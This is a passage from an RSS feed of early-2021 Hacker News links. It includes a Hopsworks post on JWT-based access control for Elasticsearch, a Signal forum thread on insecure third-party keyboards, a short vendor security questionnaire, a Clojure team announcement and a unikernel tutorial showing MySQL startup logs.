</p><figure id="w-node-44c6e7d98db1-b88dcb71"><p><img src="https://uploads-ssl.webflow.com/5e6f7cd3ee7f51ec3ea4da0f/6001bb89f179d5ce9d7be772_Screenshot%202021-01-15%20at%2016.57.47.png" loading="lazy" alt=""></p></figure><p>‍</p><p>In Hopsworks, we use Public Key Infrastructure (PKI) with X.509 certificates to authenticate and authorize users. Every user and every service in a Hopsworks cluster has a private key and an X.509 certificate. Hopsworks projects also support multi-tenant services that are not currently backed by X.509 certificates, including Elasticsearch. <a href="https://opendistro.github.io/for-elasticsearch/">Open Distro for Elasticsearch</a> supports authentication and access control using JSON Web Tokens (<a href="https://dzone.com/articles/what-is-jwt-token">JWT</a>).&nbsp; Similar to application X.509 certificates, Hopsworks’ resource manager (HopsYARN) issues a JWT for each submitted job and propagates it to running containers. Using the JWT, user code can then securely make calls to Elasticsearch indexes owned by the project. The JWT is rotated automatically before it expires and invalidated by HopsYARN once the application has finished.<br></p><p>For every Hopsworks project, a number of private indexes can be created in Elasticsearch: an index for real-time logs of applications in that project (accessible via Kibana), an index for ML experiments in the project, and an index for provenance for the project’s applications and file operations. Elastic indexes are private to the project - they are not accessible by users that are not members of the project. This access control is implemented as follows: when a request is made on Elasticsearch using a JWT token, our authorizer plugin extracts the project-specific username from the JWT token, which is of the form:<strong><em>‍</em></strong></p><p>‍<strong><em>ProjectA__Alice</em></strong>&nbsp;</p><p>The index names have the following form:</p><p><strong><em>ProjectA__ElasticIndex</em></strong>&nbsp;</p><p>Our plugin checks if a project-specific user is allowed to read/write an index by checking that the prefix (<strong>ProjectA</strong>) of both the user and the index match one another. We plan to add support for sharing elasticsearch indexes between projects by storing a list of projects allowed to perform read and write operations, respectively, on the indexes belonging to a project.</p><h2>X.509 Service certificates</h2><p>In Hopsworks, services communicate with each other using their own certificate to authenticate and encrypt all traffic. Each service in Hopsworks, that supports TLS encryption and/or authentication, has its own service-specific X.509 certificate, including all services in the ELK Stack (Elasticsearch, Kibana, and Logstash). Service certificates contain the Fully Qualified Domain Name (FQDN) of the host they are installed on and the login name of the system user that the process runs as. They are generated when a user provisions Hopsworks, and they have a long lifespan. Service certificates can be rotated automatically in configurable intervals or upon request of the administrator.&nbsp;</p><h2>Securely accessing Elastic Indexes in Jobs on Kubernetes&nbsp;<br></h2><figure id="w-node-d2ae8e066750-b88dcb71"><p><img src="https://uploads-ssl.webflow.com/5e6f7cd3ee7f51ec3ea4da0f/6001bc186b327c00f6b51384_Screenshot%202021-01-15%20at%2016.59.47.png" loading="lazy" alt=""></p></figure><p>Hopsworks can be integrated with Kubernetes by configuring it to use one of the available authentication mechanisms: API tokens, credentials, certificates, and IAM roles for AWS’ managed EKS offering. Hopsworks can run users’ jobs on Kubernetes that have project-specific security material,&nbsp; X.509 certificates and JWTs, materialized to the launched Pods so user code can securely access services in Hopsworks, such as Open Distro for …</p></div></div></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.logicalclocks.com/blog/elasticsearch-is-dead-long-live-open-distro-for-elasticsearch">https://www.logicalclocks.com/blog/elasticsearch-is-dead-long-live-open-distro-for-elasticsearch</a></em></p>]]>
            </description>
            <link>https://www.logicalclocks.com/blog/elasticsearch-is-dead-long-live-open-distro-for-elasticsearch</link>
            <guid isPermaLink="false">hacker-news-small-sites-25794987</guid>
            <pubDate>Fri, 15 Jan 2021 19:17:40 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Satran Satellite Tracking Antenna]]>
            </title>
            <description>
<![CDATA[
Score 41 | Comments 18 (<a href="https://news.ycombinator.com/item?id=25794849">thread link</a>) | @zenbryo
<br/>
January 15, 2021 | https://www.danaco.se/satellite-tracker-antenna/ | <a href="https://web.archive.org/web/*/https://www.danaco.se/satellite-tracker-antenna/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to retrieve article]]>
            </description>
            <link>https://www.danaco.se/satellite-tracker-antenna/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25794849</guid>
            <pubDate>Fri, 15 Jan 2021 19:07:36 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Clojure Core]]>
            </title>
            <description>
<![CDATA[
Score 165 | Comments 40 (<a href="https://news.ycombinator.com/item?id=25794739">thread link</a>) | @tosh
<br/>
January 15, 2021 | http://blog.fogus.me/2021/01/15/clojure-core/ | <a href="https://web.archive.org/web/*/http://blog.fogus.me/2021/01/15/clojure-core/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="body">

                <div id="post-6729">
                 <h3><a href="http://blog.fogus.me/2021/01/15/clojure-core/" title="Clojure Core">Clojure Core</a></h3>
                 <p><span>Jan 15, 2021 </span></p><p>Earlier today Rich Hickey let the cat out of the bag that <a href="https://twitter.com/richhickey/status/1350110634776657920">I’m joining the Clojure Core</a> development team.</p>

<blockquote data-width="500" data-dnt="true"><p lang="en" dir="ltr">We are excited to welcome <a href="https://twitter.com/fogus?ref_src=twsrc%5Etfw">@fogus</a>, long-time Clojure contributor and co-author of Joy of Clojure, to the Clojure core team!</p>— Rich Hickey (@richhickey) <a href="https://twitter.com/richhickey/status/1350110634776657920?ref_src=twsrc%5Etfw">January 15, 2021</a></blockquote>

<p>This is a change from my previous relationship with the Clojure Core team that in the past few years has been sporadic at best. This circumstance arose through necessity rather than desire and so I’m overjoyed to work closely with the team once again. Over the past few years <a href="https://twitter.com/puredanger">Alex Miller</a> has exerted a Herculean effort in shepherding the language through numerous versions and steady growth. I’m overjoyed to be given the opportunity to join him in helping push the language forward, and I’ll do my very best to avoid breaking everything.</p>

<p>So what this means is that I’ll be far more visible<sup id="fnref:v"><a href="#fn:v" rel="footnote">1</a></sup> in and around the Clojure ecosystem while spending my time thinking about Clojure more so than just using Clojure.<sup id="fnref:cljs"><a href="#fn:cljs" rel="footnote">2</a></sup></p>



            </div>
            <!-- end comments_wrapper -->            </div></div>]]>
            </description>
            <link>http://blog.fogus.me/2021/01/15/clojure-core/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25794739</guid>
            <pubDate>Fri, 15 Jan 2021 19:00:27 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[68.3% of people in China use third-party keyboards – many of them use Signal]]>
            </title>
            <description>
<![CDATA[
Score 91 | Comments 68 (<a href="https://news.ycombinator.com/item?id=25793438">thread link</a>) | @resynth1943
<br/>
January 15, 2021 | https://community.signalusers.org/t/signal-should-warn-users-who-are-likely-using-insecure-ime-apps/10272 | <a href="https://web.archive.org/web/*/https://community.signalusers.org/t/signal-should-warn-users-who-are-likely-using-insecure-ime-apps/10272">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="main-outlet">
        

  


      <div itemscope="" itemtype="http://schema.org/DiscussionForumPosting">
        <div>
          
          


          <p><span>
              <time itemprop="datePublished" datetime="2019-11-22T18:00:26Z">
                November 22, 2019,  6:00pm
              </time>
              <meta itemprop="dateModified" content="2019-11-22T18:00:26Z">
          <span itemprop="position">#1</span>
          </span>
        </p></div>
        <div itemprop="articleBody">
          <p>Inspired by this thread: <a href="https://twitter.com/RealSexyCyborg/status/1197695344575799296" rel="nofollow noopener">https://twitter.com/RealSexyCyborg/status/1197695344575799296</a></p>
<p>“68.3% of smartphones in China are using third-party IME apps.” (<a href="http://web.cse.ohio-state.edu/~lin.3021/file/SEC15.pdf" rel="nofollow noopener">http://web.cse.ohio-state.edu/~lin.3021/file/SEC15.pdf</a>)</p>
<p>Anecdotal evidence (from the above thread) warns that users unfamiliar with IME (or careless about its risks) are promoting Signal as “secure” without pointing out the dangers associated with third-party IME. This undercuts the purpose of the app for a large group of people, many of whom face far graver consequences for insecure communications than their English-speaking counterparts.</p>
<p>When Signal detects the user speaks a language likely to be accompanied by third-party IME, it should visibly warn the user of the risks.</p>
        </div>

        <meta itemprop="headline" content="Signal should warn users who are likely using insecure IME apps">
          <meta itemprop="keywords" content="">

        

         

            
      </div>
      <div itemscope="" itemtype="http://schema.org/DiscussionForumPosting">
        <div>
          
          <p><span itemprop="author" itemscope="" itemtype="http://schema.org/Person">
            <a itemprop="url" href="https://community.signalusers.org/u/dc7ia"><span itemprop="name">dc7ia</span></a>
            
          </span></p>


          <p><span>
              <time itemprop="datePublished" datetime="2019-11-22T18:36:33Z">
                November 22, 2019,  6:36pm
              </time>
              <meta itemprop="dateModified" content="2019-11-22T18:36:33Z">
          <span itemprop="position">#2</span>
          </span>
        </p></div>
        <div itemprop="articleBody">
          <p>Welcome to the forum.</p>
<p>What does IME stand for?</p>
        </div>

        <meta itemprop="headline" content="Signal should warn users who are likely using insecure IME apps">

        

         

      </div>
      <div itemscope="" itemtype="http://schema.org/DiscussionForumPosting">
        
        <div itemprop="articleBody">
          

<p>I could not have summed it up better… While I understand the concern, I don’t see Signal being responsible for solving this threat vector.</p>

<p>When Signal would do that, the same people would go nuts, saying that this is a violation and Signal should not track that. This time I would agree.</p>
        </div>

        <meta itemprop="headline" content="Signal should warn users who are likely using insecure IME apps">

        

         

      </div>
      <div itemscope="" itemtype="http://schema.org/DiscussionForumPosting">
        <div>
          
          <p><span itemprop="author" itemscope="" itemtype="http://schema.org/Person">
            <a itemprop="url" href="https://community.signalusers.org/u/PiCob"><span itemprop="name">PiCob</span></a>
            
          </span></p>


          <p><span>
              <meta itemprop="datePublished" content="2019-11-22T20:09:07Z">
              <time itemprop="dateModified" datetime="2019-11-22T20:09:19Z">
                November 22, 2019,  8:09pm
              </time>
          <span itemprop="position">#4</span>
          </span>
        </p></div>
        <p>input method editor (e.g. software keyboard)</p>

        <meta itemprop="headline" content="Signal should warn users who are likely using insecure IME apps">

        

         

      </div>
      <div itemscope="" itemtype="http://schema.org/DiscussionForumPosting">
        
        <div itemprop="articleBody">
          
<p>I too, have to agree that Signal should not police how you are using your device (nor should any other software, unless it is a specific tool designed for that purpose).</p>
        </div>

        <meta itemprop="headline" content="Signal should warn users who are likely using insecure IME apps">

        

         

      </div>
      <div itemscope="" itemtype="http://schema.org/DiscussionForumPosting">
        <div>
          
          <p><span itemprop="author" itemscope="" itemtype="http://schema.org/Person">
            <a itemprop="url" href="https://community.signalusers.org/u/dc7ia"><span itemprop="name">dc7ia</span></a>
            
          </span></p>


          <p><span>
              <time itemprop="datePublished" datetime="2019-11-22T21:21:55Z">
                November 22, 2019,  9:21pm
              </time>
              <meta itemprop="dateModified" content="2019-11-22T21:21:55Z">
          <span itemprop="position">#6</span>
          </span>
        </p></div>
        <p>Can Android apps get checksums of other apps? Then it could warn about some non legit apps at least.</p>

        <meta itemprop="headline" content="Signal should warn users who are likely using insecure IME apps">

        

         

      </div>
      <div itemscope="" itemtype="http://schema.org/DiscussionForumPosting">
        <div>
          
          <p><span itemprop="author" itemscope="" itemtype="http://schema.org/Person">
            <a itemprop="url" href="https://community.signalusers.org/u/johanw666"><span itemprop="name">johanw666</span></a>
            (Johanw666)
          </span></p>


          <p><span>
              <time itemprop="datePublished" datetime="2019-11-22T23:38:58Z">
                November 22, 2019, 11:38pm
              </time>
              <meta itemprop="dateModified" content="2019-11-22T23:38:58Z">
          <span itemprop="position">#8</span>
          </span>
        </p></div>
        <div itemprop="articleBody">
          
<p>Ony if you have root. But they can get a list of installed packages.</p>
        </div>

        <meta itemprop="headline" content="Signal should warn users who are likely using insecure IME apps">

        

         

      </div>
      <div itemscope="" itemtype="http://schema.org/DiscussionForumPosting">
        <div>
          
          <p><span itemprop="author" itemscope="" itemtype="http://schema.org/Person">
            <a itemprop="url" href="https://community.signalusers.org/u/mac9416"><span itemprop="name">mac9416</span></a>
            (Michael Crenshaw)
          </span></p>


          <p><span>
              <meta itemprop="datePublished" content="2019-11-23T13:06:24Z">
              <time itemprop="dateModified" datetime="2019-11-23T13:11:23Z">
                November 23, 2019,  1:11pm
              </time>
          <span itemprop="position">#9</span>
          </span>
        </p></div>
        <div itemprop="articleBody">
          <blockquote>
<p>Wait so just to be clear, the “signal vulnerability” is that Android’s Chinese keyboard sucks and people use a third party app?</p>
</blockquote>
<blockquote>
<p>While I understand the concern, I don’t see Signal being responsible for solving this threat vector.</p>
</blockquote>
<p>“Responsibility” is a bit illusory. I think it’s more useful to consider how easy it would be to add a feature that could really help people. If the impact outweighs the difficulty (and I think it probably does), then whether Signal is obligated to make the change seems like a red herring.</p>
<p>One philosopher could argue that the developers are responsible for nothing, since the app is free. Another could argue that they’re responsible for every possible “butterfly effect” of their decisions. That debate is a bit academic and I don’t think especially helpful for making decisions about feature requests.</p>
<blockquote>
<p>When Signal would do that, the same people would go nuts, saying that this is a violation and Signal should not track that. This time I would agree.</p>
</blockquote>
<p>Loss of users’ trust if the app gives the impression of “spying” on their language is a fair concern. But I think it could be implemented in a way that “tracks” nothing and offers a warning that allays any user concerns. For example, there could be a heuristic of “50% or more Chinese characters”. The first time an outgoing message triggers that heuristic, Signal could display a one-time warning. For example" It looks like you’re writing in Chinese. If you are using a third-party Chinese keyboard, it may not be secure. Consider using the phone’s built-in keyboard."</p>
        </div>

        <meta itemprop="headline" content="Signal should warn users who are likely using insecure IME apps">

        

         

      </div>
      <div itemscope="" itemtype="http://schema.org/DiscussionForumPosting">
        <div>
          
          <p><span itemprop="author" itemscope="" itemtype="http://schema.org/Person">
            <a itemprop="url" href="https://community.signalusers.org/u/mac9416"><span itemprop="name">mac9416</span></a>
            (Michael Crenshaw)
          </span></p>


          <p><span>
              <time itemprop="datePublished" datetime="2019-11-23T13:09:07Z">
                November 23, 2019,  1:09pm
              </time>
              <meta itemprop="dateModified" content="2019-11-23T13:09:07Z">
          <span itemprop="position">#10</span>
          </span>
        </p></div>
        <div itemprop="articleBody">
          <blockquote>
<p>I too, have to agree that Signal should not police how you are using your device (nor should any other software, unless it is a specific tool designed for that purpose).</p>
</blockquote>
<p>Absolutely, and I wouldn’t recommend any form of policing. But a well-timed and well-placed warning of this <em>very</em> common threat wouldn’t be (and I don’t think would even be perceived as) policing. The warning could be phrased in a way that emphasizes the risks of using third-party IME <em>alongside</em> Signal and makes no general claims about whether the user should take advantage of those apps in other contexts.</p>
        </div>

        <meta itemprop="headline" content="Signal should warn users who are likely using insecure IME apps">

        

         

      </div>
      <div itemscope="" itemtype="http://schema.org/DiscussionForumPosting">
        <div>
          
          <p><span itemprop="author" itemscope="" itemtype="http://schema.org/Person">
            <a itemprop="url" href="https://community.signalusers.org/u/mac9416"><span itemprop="name">mac9416</span></a>
            (Michael Crenshaw)
          </span></p>


          <p><span>
              <time itemprop="datePublished" datetime="2019-11-23T13:14:00Z">
                November 23, 2019,  1:14pm
              </time>
              <meta itemprop="dateModified" content="2019-11-23T13:14:00Z">
          <span itemprop="position">#11</span>
          </span>
        </p></div>
        <div itemprop="articleBody">
          
<p>That sounds like it has the potential to be a really slick heuristic. “You seem to be using X app… here’s why that might be a problem.” On the other hand, there might be a higher risk of false positives than with a “50%+ Chinese characters” heuristic. I’ll have to defer to folks who know more about app development.</p>
        </div>

        <meta itemprop="headline" content="Signal should warn users who are likely using insecure IME apps">

        

         

      </div>
      <div itemscope="" itemtype="http://schema.org/DiscussionForumPosting">
        <div>
          
          <p><span itemprop="author" itemscope="" itemtype="http://schema.org/Person">
            <a itemprop="url" href="https://community.signalusers.org/u/johanw666"><span itemprop="name">johanw666</span></a>
            (Johanw666)
          </span></p>


          <p><span>
              <time itemprop="datePublished" datetime="2019-11-23T13:18:26Z">
                November 23, 2019,  1:18pm
              </time>
              <meta itemprop="dateModified" content="2019-11-23T13:18:26Z">
          <span itemprop="position">#12</span>
          </span>
        </p></div>
        <div itemprop="articleBody">
          <p>Well, it has sometimes uses if you want to launch another app from an app with an intent. For example, if your app includes a user manual in pdf form and wants to show it in the standard pdf reader on the device. If there is no pdf reader you want to give a warning explaining the issue.</p>
<p>Code to heck it is really easy, see <a href="https://stackoverflow.com/questions/2695746/how-to-get-a-list-of-installed-android-applications-and-pick-one-to-run" rel="nofollow noopener">this article on Stackoverflow</a> how to do that.</p>
<p>The asked for checksum would require to locate the installed apk and read it, which requires root. And split apk’s would make it even more difficult.</p>
        </div>

        <meta itemprop="headline" content="Signal should warn users who are likely using insecure IME apps">

        

         

      </div>
      <div itemscope="" itemtype="http://schema.org/DiscussionForumPosting">
        <div>
          
          <p><span itemprop="author" itemscope="" itemtype="http://schema.org/Person">
            <a itemprop="url" href="https://community.signalusers.org/u/wrapper"><span itemprop="name">wrapper</span></a>
            (Bobby)
          </span></p>


          <p><span>
              <time itemprop="datePublished" datetime="2021-01-12T14:40:33Z">
                January 12, 2021,  2:40pm
              </time>
              <meta itemprop="dateModified" content="2021-01-12T14:40:33Z">
          <span itemprop="position">#13</span>
          </span>
        </p></div>
        <p>Just here to bump this issue as it is clearly still relevant and is quite concerning that Signal isn’t offering a response?</p>

        <meta itemprop="headline" content="Signal should warn users who are likely using insecure IME apps">

        

         

      </div>
      <div itemscope="" itemtype="http://schema.org/DiscussionForumPosting">
        <div>
          
          <p><span itemprop="author" itemscope="" itemtype="http://schema.org/Person">
            <a itemprop="url" href="https://community.signalusers.org/u/newuser"><span itemprop="name">newuser</span></a>
            
          </span></p>


          <p><span>
              <meta itemprop="datePublished" content="2021-01-12T15:00:30Z">
              <time itemprop="dateModified" datetime="2021-01-12T15:02:46Z">
                January 12, 2021,  3:02pm
              </time>
          <span itemprop="position">#15</span>
          </span>
        </p></div>
        <div itemprop="articleBody">
          <p>There was a lot of discussion on warning users that notifications could also be logged. It seems like there are a lot of problematic things in Android that people need to be aware of and protect themselves accordingly. I’m not sure how much of a role Signal should play in that or even if it needs to.</p>
<p>Other things I can immediately think of:<br>
export a photo?it might get stored in some cloud service<br>
listening to a voice note? the digital assistant might also be listening to it</p>
        </div>

        <meta itemprop="headline" content="Signal should warn users who are likely using insecure IME apps">

        

         

      </div>
      <div itemscope="" itemtype="http://schema.org/DiscussionForumPosting">
        <div>
          
          <p><span itemprop="author" itemscope="" itemtype="http://schema.org/Person">
            <a itemprop="url" href="https://community.signalusers.org/u/wrapper"><span itemprop="name">wrapper</span></a>
            (Bobby)
          </span></p>


          <p><span>
              <time itemprop="datePublished" datetime="2021-01-12T15:18:56Z">
                January 12, 2021,  3:18pm
              </time>
              <meta itemprop="dateModified" content="2021-01-12T15:18:56Z">
          <span itemprop="position">#16</span>
          </span>
        </p></div>
        <div itemprop="articleBody">
          <p>I understand the argument. The issue is that with the huge influx of new users, Signal do have a responsibility to flag such potential security flaws.</p>
<p>It seems like a pretty obvious thing for them to offer an untracked keyboard option in the app anyway, like some banking apps do. Or just a warning to ensure your Android device is secure.</p>
        </div>

        <meta itemprop="headline" content="Signal should warn users who are likely using insecure IME apps">

        

         

      </div>
      <div itemscope="" itemtype="http://schema.org/DiscussionForumPosting">
        <div>
          
          <p><span itemprop="author" itemscope="" itemtype="http://schema.org/Person">
            <a itemprop="url" href="https://community.signalusers.org/u/jwithing"><span itemprop="name">jwithing</span></a>
            (Jeff)
          </span></p>


          <p><span>
              <time itemprop="datePublished" datetime="2021-01-12T15:24:29Z">
                January 12, 2021,  3:24pm
              </time>
              <meta itemprop="dateModified" content="2021-01-12T15:24:29Z">
          <span itemprop="position">#17</span>
          </span>
        </p></div>
        <p>I agree that Signal should warn users who are using insecure IME. Signal has a responsibility to clearly communicate attack vectors to users, especially as an increasing number of less sophisticated users join the platform.</p>

        <meta itemprop="headline" content="Signal should warn users who are likely using insecure IME apps">

        

         

      </div>
      <div itemscope="" itemtype="http://schema.org/DiscussionForumPosting">
        <div>
          
          <p><span itemprop="author" itemscope="" itemtype="http://schema.org/Person">
            <a itemprop="url" href="https://community.signalusers.org/u/newuser"><span itemprop="name">newuser</span></a>
            
          </span></p>


          <p><span>
              <time itemprop="datePublished" datetime="2021-01-12T15:33:39Z">
                January 12, 2021,  3:33pm
              </time>
              <meta itemprop="dateModified" content="2021-01-12T15:33:39Z">
          <span itemprop="position">#18</span>
          </span>
        </p></div>
        <p>Do you mean the incognito keyboard setting or do you want them to include a keyboard of their own? If the latter, it probably could be a well vetted separate app that someone else provides.</p>

        <meta itemprop="headline" content="Signal should warn users who are likely using insecure IME apps">

        

         

            
      </div>
      <div itemscope="" itemtype="http://schema.org/DiscussionForumPosting">
        <div>
          
          <p><span itemprop="author" itemscope="" itemtype="http://schema.org/Person">
            <a itemprop="url" href="https://community.signalusers.org/u/wrapper"><span itemprop="name">wrapper</span></a>
           …</span></p></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://community.signalusers.org/t/signal-should-warn-users-who-are-likely-using-insecure-ime-apps/10272">https://community.signalusers.org/t/signal-should-warn-users-who-are-likely-using-insecure-ime-apps/10272</a></em></p>]]>
            </description>
            <link>https://community.signalusers.org/t/signal-should-warn-users-who-are-likely-using-insecure-ime-apps/10272</link>
            <guid isPermaLink="false">hacker-news-small-sites-25793438</guid>
            <pubDate>Fri, 15 Jan 2021 17:29:41 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Our Dumb Security Questionnaire]]>
            </title>
            <description>
<![CDATA[
Score 147 | Comments 84 (<a href="https://news.ycombinator.com/item?id=25793230">thread link</a>) | @zdw
<br/>
January 15, 2021 | https://hangar.tech/posts/our-dsq/ | <a href="https://web.archive.org/web/*/https://hangar.tech/posts/our-dsq/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article><p>Last year, one of our startups needed to buy a SaaS product (case management and workflow software). There were several promising vendors, all with products that looked impressive. Technically, all had the features and APIs we were looking for. However, we had security concerns. We planned on storing extremely sensitive data in this tool, and wanted to understand their security posture before we selected a vendor.</p><p>This a common problem; you’ve probably ran into it yourself. With SaaS software, how do you verify its security? As an industry, our answers are … poor. We have various certifications (PCI, HIPAA/HITECH, FedRAMP, etc), but all too often these are box-ticking exercises with no real security value – just ask <a href="https://www.schneier.com/blog/archives/2020/12/russias-solarwinds-attack.html">SolarWinds</a>.</p><p>So, security teams often end up sending potential vendors a bunch of questions – what Latacora calls a <a href="https://latacora.micro.blog/its-weird-to/">Dumb Security Questionnaire</a>. As the title implies, the practice … isn’t great. Most DSQs are full of questions with no security value (which explains why most security teams don’t actually read the responses!). But unfortunately, they’re also kinda the best we can do. Huge companies might be able to afford real human-powered security audits and convince vendors to allow them, but small startups like ours don’t have a better option than relying on DSQs.</p><p>As Latacora points out, it turns out there isn’t really a ton that you need to ask. As a startup, we’re not looking for our vendor to be Fort Knox; we just need to know that storing data with them is at least as safe as storing it internally. There are a limited number of likely ways that our vendor might get owned; we just need to ask about those few basic things. Latacora ends their post with this:</p><blockquote><p>Someone — and I am not volunteering — should write the DSQ that just nails these basic
things. 10 questions, no diagrams.</p></blockquote><p>Well, we tried; here it is.</p><h3 id="who-this-is-for">Who this is for</h3><p>This questionnaire is designed for smaller, probably early-stage companies who need to evaluate a vendor. It makes some assumptions:</p><ul><li>You have a security person (or team) who can evaluate the answers and is part of the decision-making process. If nobody’s going to read the answers, don’t waste your vendor’s time.</li><li><em>Your</em> answers to these questions are already pretty ok. If not, stop wasting time evaluating vendors. Just buy the thing and use the time you save to get your own house in order.</li><li>This is for some SaaS product that’ll have particularly high security impact - i.e. a breach of the vendor would be a major, potentially company-ending event. If you’re just trying to decide which ticket tracking system to use, again: just buy one and move on.</li><li>You have no particular compliance requirements – so you’re looking purely evaluate security posture, not compliance.</li></ul><h3 id="our-dumb-security-questionnaire">Our Dumb Security Questionnaire</h3><h4 id="1-please-answer-these-questions">(1) Please answer these questions:</h4><ol><li>If you use a cloud provider (GCP/AWS/Azure/etc):<ul><li>describe how credentials are provisioned, managed, and stored.</li><li>If an attacker gained access to an individual developer’s cloud
credentials, what actions could that attacker perform, and how would you
detect and respond to the breach?</li></ul></li><li>If you don’t use a cloud provider: why not?</li><li>Describe how staff authenticate to company services (e.g. servers, email, SaaS
products), particularly highlighting your use of password managers, 2FA, and
SSO.</li><li>What development practices do you use to protect against the OWASP Top 10?</li><li>Describe the steps a developer or operations person takes to push new code to production.</li><li>Have you had any security breaches in the last two years?<ul><li>If yes: please explain the breach, and provide copies of any postmortem/root cause analysis/after-action reports.</li></ul></li></ol><h4 id="2-and-please-provide-as-many-of-the-following-as-possible">(2) And, please provide as many of the following as possible:</h4><ol><li>A recent (last 12 months) penetration test report, with information on what
follow-ups/remediation steps were taken. Reports by an external firm are
preferable; internal tests are OK. A redacted summary is fine as long as it
includes basic vulnerability descriptions and severity levels.</li><li>Documentation on your organization’s Secure Development Lifecycle, or similar, if you
have them. If not, please summarize the steps you take to help engineers write secure
code.</li><li>A copy of any security training material provided to staff, particularly
software developers. A summary/description of classes and content is fine.</li><li>A link to your Vulnerability Disclosure Policy and/or bug bounty program. If you don’t
have either: please explain.</li></ol><p>(10 questions, no diagrams :)</p><h4 id="license">License</h4><p>This questionnaire is <a href="https://creativecommons.org/publicdomain/zero/1.0/">released to the public domain</a>. We’d appreciate it if you credit us if you release a
derivative of this, but do what you like.</p></article></div>]]>
            </description>
            <link>https://hangar.tech/posts/our-dsq/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25793230</guid>
            <pubDate>Fri, 15 Jan 2021 17:13:20 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Running MatterMost as a Unikernel]]>
            </title>
            <description>
<![CDATA[
Score 23 | Comments 8 (<a href="https://news.ycombinator.com/item?id=25792618">thread link</a>) | @eyberg
<br/>
January 15, 2021 | https://nanovms.com/dev/tutorials/running-mattermost-as-unikernel | <a href="https://web.archive.org/web/*/https://nanovms.com/dev/tutorials/running-mattermost-as-unikernel">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

                <p>Mattermost is an open source, private cloud slack
alternative written in Go and React. It has many integrations and can
can connect to mysql or postgres for persistence. While there are many
"hello world" tutorials out there for running the Nanos unikernel we
thought this would be a nice little example to showcase two things:</p>

<p>1) How to run a multi-node setup. Most web applications are more than
just one actual application - the canonical example would be a webapp
server and its corresponding database.</p>
<p>2) How to interact with taps and bridges for a faster networking
experience or if you wanted to build your own private cloud. (Creating taps,
today, will only work on Linux as the tuntaposx package does not work
anymore but we're looking at alternatives.)</p>

<p>Ready? Let's get started.</p>

                <h3>Running mysql as a Nanos unikernel</h3>

                <p>We start by running the mysql server as a unikernel.
We've created a convenient package to use and the only thing you need to
do is set your base volume size. You could create an external volume but
we'll leave that to a different article.</p>

<pre><code>{
  "BaseVolumeSz": "400m"
}
</code></pre>

<p>Now let's run mysql by creating a tap device and assigning it a
static ip:</p>

                <pre><code>➜  mysql ops load mysql_5.7.29 -c config.json -p 3306 -b -t tap0 --ip-address 192.168.42.19
[mysqld --user=root --explicit_defaults_for_timestamp]
booting /home/eyberg/.ops/images/mysqld.img ...
assigned: 192.168.42.19
2021-01-11T17:45:54.942930Z 0 [Warning] The syntax '--log_warnings/-W' is deprecated and will be removed in a future release. Please use '--log_error_verbosity' instead.
2021-01-11T17:45:54.945335Z 0 [Warning] Insecure configuration for --secure-file-priv: Location is accessible to all OS users. Consider choosing a different directory.
2021-01-11T17:45:54.945564Z 0 [Note] mysqld (mysqld 5.7.29-0ubuntu0.18.04.1-log) starting as process 2 ...
2021-01-11T17:45:54.957853Z 0 [Note] InnoDB: PUNCH HOLE support available
2021-01-11T17:45:54.959551Z 0 [Note] InnoDB: Mutexes and rw_locks use GCC atomic builtins
2021-01-11T17:45:54.961557Z 0 [Note] InnoDB: Uses event mutexes
2021-01-11T17:45:54.962979Z 0 [Note] InnoDB: GCC builtin __atomic_thread_fence() is used for memory barrier
2021-01-11T17:45:54.965371Z 0 [Note] InnoDB: Compressed tables use zlib 1.2.11
2021-01-11T17:45:54.967107Z 0 [Note] InnoDB: Using Linux native AIO
2021-01-11T17:45:54.968929Z 0 [Note] InnoDB: Number of pools: 1
2021-01-11T17:45:54.970498Z 0 [Note] InnoDB: Using CPU crc32 instructions
2021-01-11T17:45:54.974749Z 0 [Note] InnoDB: Initializing buffer pool, total size = 128M, instances = 1, chunk size = 128M
2021-01-11T17:45:54.985275Z 0 [Note] InnoDB: Completed initialization of buffer pool
2021-01-11T17:45:54.989751Z 0 [Note] InnoDB: If the mysqld execution user is authorized, page cleaner thread priority can be changed. See the man page of setpriority().
2021-01-11T17:45:55.008773Z 0 [Note] InnoDB: Highest supported file format is Barracuda.
2021-01-11T17:45:55.024639Z 0 [Note] InnoDB: Creating shared tablespace for temporary tables
2021-01-11T17:45:55.026961Z 0 [Note] InnoDB: Setting file './ibtmp1' size to 12 MB. Physically writing the file full; Please wait ...
2021-01-11T17:45:55.062911Z 0 [Note] InnoDB: File './ibtmp1' size is now 12 MB.
2021-01-11T17:45:55.065453Z 0 [Note] InnoDB: 96 redo rollback segment(s) found. 96 redo rollback segment(s) are active.
2021-01-11T17:45:55.068301Z 0 [Note] InnoDB: 32 non-redo rollback segment(s) are active.
2021-01-11T17:45:55.070845Z 0 [Note] InnoDB: 5.7.29 started; log sequence number 2631215
2021-01-11T17:45:55.073134Z 0 [Note] InnoDB: Loading buffer pool(s) from /var/lib/mysql/ib_buffer_pool
2021-01-11T17:45:55.075770Z 0 [Note] Plugin 'FEDERATED' is disabled.
2021-01-11T17:45:55.086078Z 0 [Note] InnoDB: Buffer pool(s) load completed at 210111 17:45:55
2021-01-11T17:45:55.097471Z 0 [Note] Found ca.pem, server-cert.pem and server-key.pem in data directory. Trying to enable SSL support using them.
2021-01-11T17:45:55.100836Z 0 [Note] Skipping generation of SSL certificates as certificate files are present in data directory.
2021-01-11T17:45:55.105239Z 0 [Warning] CA certificate ca.pem is self signed.
2021-01-11T17:45:55.107312Z 0 [Note] Skipping generation of RSA key pair as key files are present in data directory.
2021-01-11T17:45:55.110568Z 0 [Note] Server hostname (bind-address): '0.0.0.0'; port: 3306
